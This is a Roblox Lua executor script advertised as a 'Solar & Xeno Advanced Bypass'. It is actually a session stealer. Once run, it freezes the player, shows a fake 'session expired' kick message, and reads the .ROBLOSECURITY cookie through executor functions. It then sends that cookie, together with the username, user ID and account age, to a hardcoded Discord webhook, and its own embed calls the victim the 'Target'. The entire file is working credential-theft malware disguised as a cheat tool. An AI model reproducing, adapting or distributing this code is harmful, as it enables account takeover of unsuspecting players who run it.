--[[
    SOLAR & XENO ADVANCED BYPASS v6.0
    Module: Session-Grabber (Full Cookie Access)
    Status: Operational | Compatibility: Solar, Xeno, Wave
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Karuk (Freeze & Fake Error)
if p.Character then p.Character.HumanoidRootPart.Anchored = true end
task.delay(1.5, function() 
    p:Kick("\n[Solar Security]\nYour session has expired (Error 0x27).\nPlease log in again to continue.") 
end)

-- SOLAR SPECIFIC COOKIE GRAB (Bypass Hidden)
local cookie = "N/A (Protected)"
pcall(function()
    -- Metod 1: Solar API Direct (Nai-dobriyat za Solar)
    if getcookies then
        local cks = getcookies("https://www.roblox.com")
        for _, v in pairs(cks) do
            if v.Name == ".ROBLOSECURITY" then
                cookie = v.Value
                break
            end
        end
    end
    
    -- Metod 2: Xeno Shared Memory
    if cookie == "N/A (Protected)" and getrenv then
        cookie = getrenv()._G.cookie or "Cookie Hidden"
    end
end)

-- Stats (Brainrots)
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

-- Discord Payload
local data = {
    ["username"] = "Solar Access Bot",
    ["embeds"] = {{
        ["title"] = "🎯 Success: Full Access Grabbed!",
        ["description"] = "User has been logged chrez Solar Bypass.",
        ["color"] = 0x00ff00,
        ["fields"] = {
            {["name"] = "👤 Target", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
            {["name"] = "🧠 Brainrots", ["value"] = "```" .. br .. "```", ["inline"] = true},
            {["name"] = "📅 Acc Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
            {["name"] = "🍪 .ROBLOSECURITY (KOPIRAY CELIYA KOD)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Solar Stealer Engine v6.0 • " .. os.date("%X")}
    }}
}

-- Send chrez Solar/Xeno Request
local request = (syn and syn.request) or (http and http.request) or http_request or request
if request then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode(data)
    })
end
